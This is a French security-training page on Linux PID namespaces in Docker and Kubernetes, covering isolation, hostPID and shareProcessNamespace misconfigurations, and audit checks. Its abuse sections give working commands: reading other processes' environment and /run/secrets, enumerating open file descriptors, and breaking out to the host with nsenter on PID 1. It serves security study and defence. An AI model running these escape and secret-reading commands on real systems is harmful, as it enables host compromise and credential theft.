# Espace de noms PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d’ensemble

L’espace de noms PID contrôle la manière dont les processus sont numérotés et les processus qui sont visibles. C’est pourquoi un conteneur peut avoir son propre PID 1 même s’il ne s’agit pas d’une véritable machine. À l’intérieur de l’espace de noms, le workload voit ce qui ressemble à une arborescence locale des processus. En dehors de l’espace de noms, l’hôte voit toujours les véritables PID de l’hôte ainsi que l’ensemble des processus présents sur celui-ci.<sup>[[3]](#references)</sup>

Du point de vue de la sécurité, l’espace de noms PID est important, car la visibilité des processus a une grande valeur. Dès qu’un workload peut voir les processus de l’hôte, il peut être en mesure d’observer les noms des services, les arguments de la ligne de commande, les secrets transmis dans les arguments des processus, les informations dérivées de l’environnement via `/proc`, ainsi que les cibles potentielles d’entrée dans un espace de noms. S’il peut faire davantage que voir ces processus, par exemple en envoyant des signaux ou en utilisant ptrace dans les bonnes conditions, le problème devient beaucoup plus sérieux.

## Fonctionnement

Un nouvel espace de noms PID commence avec sa propre numérotation interne des processus. Le premier processus créé à l’intérieur devient le PID 1 du point de vue de cet espace de noms, ce qui signifie également qu’il bénéficie d’une sémantique spéciale similaire à celle d’init pour les processus enfants orphelins et le comportement des signaux. Cela explique de nombreuses particularités des conteneurs concernant les processus init, la récupération des processus zombies et l’utilisation occasionnelle de petits wrappers init dans les conteneurs.<sup>[[3]](#references)</sup>

Les espaces de noms PID forment une hiérarchie. Un processus situé dans un espace de noms ancêtre peut adresser les descendants en utilisant le PID attribué dans cet ancêtre, mais un descendant ne peut pas adresser les tâches propres à un ancêtre via les syscalls ordinaires fondés sur les PID, ni utiliser `setns()` pour remonter vers l’espace de noms PID d’un ancêtre. Un procfs appartenant à un ancêtre et délibérément exposé au descendant peut néanmoins leak la vue des processus de l’ancêtre. De plus, rejoindre un espace de noms PID avec `setns()` modifie l’espace de noms des **futurs enfants**, et non celui de l’appelant lui-même ; les outils effectuent donc un fork après avoir rejoint l’espace de noms. Un montage procfs conserve la vue PID du processus qui l’a monté, ce qui explique pourquoi créer un procfs vierge après `unshare(CLONE_NEWPID)` est pertinent pour la sécurité et pas uniquement cosmétique.<sup>[[3]](#references)</sup>

La leçon importante en matière de sécurité est qu’un processus peut sembler isolé parce qu’il ne voit que sa propre arborescence de PID, mais que cet isolement peut être supprimé délibérément. Docker expose cette possibilité via `--pid=host`, tandis que Kubernetes le fait avec `hostPID: true`. Une fois que le conteneur a rejoint l’espace de noms PID de l’hôte, le workload voit directement les processus de l’hôte, et de nombreux chemins d’attaque ultérieurs deviennent beaucoup plus réalistes.

## Lab

Pour créer manuellement un espace de noms PID :
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Le shell voit désormais une vue privée des processus. L’option `--mount-proc` est importante, car elle monte une instance de procfs correspondant au nouvel espace de noms PID, ce qui rend la liste des processus cohérente depuis l’intérieur.<sup>[[3]](#references)</sup>

Pour comparer le comportement des conteneurs :
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La différence est immédiate et facile à comprendre, raison pour laquelle il s’agit d’un bon premier lab pour les lecteurs.

## Utilisation à l’exécution

Les conteneurs normaux dans Docker, Podman, containerd et CRI-O obtiennent leur propre PID namespace. Les conteneurs Kubernetes ont normalement des vues distinctes des PID ; `shareProcessNamespace: true` crée délibérément une vue commune à tout le Pod.<sup>[[4]](#references)</sup> En revanche, `hostPID: true` sélectionne le PID namespace du nœud. Les environnements LXC/Incus reposent sur la même primitive du kernel, bien que les cas d’utilisation des system-containers puissent exposer des arbres de processus plus complexes et encourager davantage de raccourcis de debugging.

La même règle s’applique partout : si le runtime a choisi de ne pas isoler le PID namespace, il s’agit d’une réduction délibérée de la boundary du conteneur.

## Mauvaises configurations

La mauvaise configuration canonique est le partage du PID namespace de l’hôte. Les équipes le justifient souvent par des besoins de debugging, de monitoring ou de gestion des services, mais cela doit toujours être considéré comme une exception de sécurité significative. Même si le conteneur ne dispose d’aucune primitive d’écriture immédiate sur les processus de l’hôte, la visibilité seule peut révéler beaucoup d’informations sur le système. Dès que des capabilities telles que `CAP_SYS_PTRACE` ou un accès utile à procfs sont ajoutés, le risque augmente considérablement.

Une autre erreur consiste à supposer que, puisque la workload ne peut par défaut ni tuer ni utiliser ptrace sur les processus de l’hôte, le partage du PID namespace est donc inoffensif. Cette conclusion ignore la valeur de l’énumération, la disponibilité de cibles pour entrer dans un namespace et la manière dont la visibilité des PID se combine avec d’autres contrôles affaiblis.

### Partage des processus à l’échelle du Pod Kubernetes

`shareProcessNamespace: true` est différent de `hostPID` : il expose les processus des **autres conteneurs du même Pod**, et non les processus du nœud. Un sidecar compromis ou un conteneur de debugging peut alors énumérer les lignes de commande et les données d’environnement des conteneurs frères, sous réserve des contrôles d’accès de procfs, envoyer des signaux lorsque les credentials l’autorisent et parcourir le filesystem d’un conteneur frère via `/proc/<pid>/root`. Kubernetes avertit explicitement que les secrets présents dans la ligne de commande ou l’environnement, ainsi que les filesystems des conteneurs, ne sont alors protégés que par les permissions Unix applicables.<sup>[[4]](#references)</sup>

Vérification utile côté cluster :
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Depuis un conteneur compromis dans un PID namespace à l’échelle du Pod, testez d’abord l’accès réel au lieu de supposer que la visibilité équivaut à la lisibilité :<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Abus

Si le host PID namespace est partagé, un attaquant peut inspecter les processus de l’hôte, récupérer les arguments des processus, identifier des services intéressants, trouver des PIDs candidats pour `nsenter` ou combiner la visibilité des processus avec des privilèges liés à `ptrace` afin d’interférer avec les workloads de l’hôte ou voisins. Dans certains cas, il suffit de voir le bon processus de longue durée pour réorienter le reste du plan d’attaque.

La première étape pratique consiste toujours à confirmer que les processus de l’hôte sont réellement visibles :
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Une fois les PID de l’hôte visibles, les arguments des processus et les cibles d’entrée dans les namespaces deviennent souvent la source d’informations la plus utile :
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` est disponible et que les privilèges sont suffisants, vérifiez si un processus hôte visible peut être utilisé comme pont vers un namespace :
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Même lorsque l'entrée est bloquée, le partage des PID de l'hôte reste déjà précieux, car il révèle la structure des services, les composants d'exécution et les processus privilégiés susceptibles d'être ciblés ensuite. La simple visibilité des PID **n'accorde pas** l'autorisation d'envoyer des signaux, d'effectuer un traçage, de lire les entrées sensibles de `/proc/<pid>`, ni de rejoindre les autres namespaces de la cible ; les identifiants, la possibilité de dump, les capabilities dans le user namespace propriétaire du namespace cible, la politique Yama/LSM et seccomp restent déterminants.<sup>[[3]](#references)</sup> Consultez [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) pour des exemples d'injection de processus.

La visibilité des PID de l'hôte rend également les abus de descripteurs de fichiers plus réalistes. Si un processus privilégié de l'hôte ou une workload voisine possède un fichier ou un socket sensible ouvert, l'attaquant peut être en mesure d'inspecter `/proc/<pid>/fd/` et d'accéder à l'objet sous-jacent, selon les vérifications de type ptrace, la propriété, les options de montage de procfs, le type d'objet et le modèle du service cible. Le simple fait de voir un lien symbolique vers un FD ne signifie pas qu'il peut être ouvert, et un socket ne peut pas être dupliqué simplement en ouvrant son lien symbolique `/proc/<pid>/fd/N`. Pour la primitive distincte `pidfd_getfd()` et ses vérifications d'autorisation, consultez [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ces commandes sont utiles, car elles indiquent si `hidepid=1` ou `hidepid=2` réduit la visibilité entre les processus et si des descripteurs manifestement intéressants, tels que des fichiers secrets ouverts, des logs ou des sockets Unix, sont visibles.

### Exemple complet : PID de l'hôte + `nsenter`

Le partage du PID de l'hôte devient un escape direct vers l'hôte lorsque le processus dispose également de privilèges suffisants pour rejoindre les namespaces de l'hôte :
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si la commande réussit, le processus du container s’exécute désormais dans les namespaces mount, UTS, network, IPC et PID de l’hôte. L’impact est une compromission immédiate de l’hôte.

Même lorsque `nsenter` lui-même est absent, le même résultat peut être obtenu via le binaire de l’hôte si le système de fichiers de l’hôte est monté :
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notes récentes sur le runtime

Certaines attaques pertinentes pour les PID namespaces ne sont pas des mauvaises configurations traditionnelles `hostPID: true`, mais des bugs d’implémentation du runtime liés à la manière dont les protections de procfs sont appliquées lors de la configuration du container.

#### Race de `maskedPaths` vers le procfs de l’hôte

Dans les versions vulnérables de `runc`, les attaquants capables de contrôler l’image du container ou la charge de travail de `runc exec` pouvaient provoquer une race pendant la phase de masquage en remplaçant le `/dev/null` du container par un symlink vers un chemin procfs sensible tel que `/proc/sys/kernel/core_pattern`. Si la race réussissait, le bind mount du chemin masqué pouvait cibler la mauvaise destination et exposer au nouveau container des paramètres procfs globaux de l’hôte.<sup>[[1]](#references)</sup>

Commande utile pour la revue :
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Cela est important, car l’impact final peut être le même qu’une exposition directe de procfs : `core_pattern` ou `sysrq-trigger` inscriptible, suivie d’une exécution de code sur l’hôte ou d’un déni de service. Les pages dédiées aux [masked paths](../masked-paths.md) et aux [sensitive host mounts](../../sensitive-host-mounts.md) couvrent la surface d’attaque générale de procfs sans la dupliquer ici.

#### Injection de namespace avec `insject`

Les outils d’injection de namespace tels que `insject` montrent que l’interaction avec le PID namespace ne nécessite pas toujours d’entrer au préalable dans le namespace cible avant la création du processus. Un helper peut s’y attacher ultérieurement, utiliser `setns()`, puis exécuter du code tout en conservant une visibilité sur l’espace des PID cible :<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ce type de technique est principalement utile pour le debugging avancé, les outils offensifs et les workflows de post-exploitation lorsque le contexte du namespace doit être rejoint après l'initialisation du workload par le runtime.

### Modèles d'abus des FD associés

Deux modèles méritent d'être explicitement mentionnés lorsque les PIDs de l'hôte sont visibles. Premièrement, un processus privilégié peut conserver un file descriptor sensible ouvert lors d'un `execve()` parce qu'il n'a pas été marqué `O_CLOEXEC`. Deuxièmement, les services peuvent transmettre des file descriptors via des sockets Unix au moyen de `SCM_RIGHTS`. Dans les deux cas, l'objet intéressant n'est plus le pathname, mais le handle déjà ouvert qu'un processus moins privilégié peut hériter ou recevoir.

Cela est important dans le cadre du travail sur les containers, car le handle peut pointer vers `docker.sock`, un log privilégié, un fichier de secrets de l'hôte ou un autre objet de grande valeur, même si le chemin lui-même n'est pas directement accessible depuis le filesystem du container.

## Vérifications

Le but de ces commandes est de déterminer si le processus dispose d'une vue PID privée ou s'il peut déjà énumérer un environnement de processus beaucoup plus vaste.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Qu’est-ce qui est intéressant ici :<sup>[[3]](#references)</sup>

- Si la liste des processus contient des services évidents de l’hôte, le partage des PID de l’hôte est probablement déjà actif.
- Ne voir qu’une petite arborescence locale au conteneur est la situation normale ; voir `systemd`, `dockerd` ou des daemons sans rapport ne l’est pas.
- `NSpid` peut exposer le mapping des PID entre les namespaces imbriqués. La valeur la plus à gauche est relative au PID namespace associé au montage procfs, suivie des valeurs correspondant aux namespaces successivement imbriqués.
- `readlink /proc/self/ns/pid` ne peut pas, à lui seul, prouver `hostPID` : un conteneur isolé possède également un inode valide de PID namespace. Corrélez-le avec la liste des processus, le montage procfs, la configuration du runtime et, lorsqu’il est disponible, un inode de namespace côté hôte.
- Une fois les PID de l’hôte visibles, même les informations en lecture seule sur les processus deviennent utiles pour la reconnaissance.

Si vous découvrez qu’un conteneur s’exécute avec le partage des PID de l’hôte, ne considérez pas cela comme une simple différence cosmétique. Il s’agit d’un changement majeur de ce que le workload peut observer et potentiellement affecter.



## References

- [1] [Avis de sécurité runc : container escape via l’abus de « masked path » dû à des conditions de course lors du montage (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject : A Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 book](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Share Process Namespace between Containers in a Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
